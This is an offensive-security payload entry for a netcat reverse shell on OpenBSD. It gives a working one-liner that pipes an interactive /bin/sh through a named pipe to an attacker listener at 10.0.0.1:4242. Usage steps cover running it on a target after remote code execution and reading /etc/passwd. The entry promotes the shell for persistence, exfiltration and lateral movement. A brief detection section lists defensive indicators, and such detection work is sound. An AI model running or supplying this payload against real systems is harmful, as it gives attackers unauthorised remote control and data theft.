---
id: 6539f247-593f-44b7-a42c-062a7e5c24fd
name: OpenBSD-Netcat-Reverse-Shell-via-Named-Pipe
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:24.385768+00:00'
updated_at: '2023-04-10T20:25:30.200593+00:00'
platforms:
  - OpenBSD
  - Unix
tags:
  - reverse-shell
  - netcat
  - payload
  - post-exploitation
validated: true
---

# OpenBSD-Netcat-Reverse-Shell-via-Named-Pipe

## Code

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

## Description

This bash one-liner establishes a reverse TCP shell from an OpenBSD target to an attacker listener using Netcat. It creates a named pipe (/tmp/f) to redirect the interactive shell's I/O through the Netcat connection, compensating for OpenBSD Netcat's lack of -e (execute) support. Run this on the target after setting up a Netcat listener on the attacker side.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 10.0.0.1 | Attacker's IP address (replace with actual reachable IP) | 192.168.1.100 |
| 4242 | Attacker's listening port (replace with the port from the listener command) | 4444 |

## Usage

1. On attacker: Run `nc -l 4242` to listen.
2. On target: Execute this one-liner in a shell (e.g., via initial access vector like RCE).
3. Interact via the listener: Send commands like `ls` or `cat /etc/passwd`.
This payload is ideal for Unix-like systems without advanced shell tools, providing persistent access for data exfiltration or lateral movement.

## Detection

- Audit logs for bash executions of piped commands involving nc and mkfifo.
- Filesystem monitoring for temporary FIFOs in /tmp (e.g., /tmp/f).
- Network flows: Outbound TCP from shell processes to attacker IP on non-standard ports.
- Process trees showing sh spawned by nc or unusual pipe usage.

## Related

- [[procedures/Establish-Reverse-Shell-with-Netcat-on-OpenBSD]]
- [[tools/Netcat]]
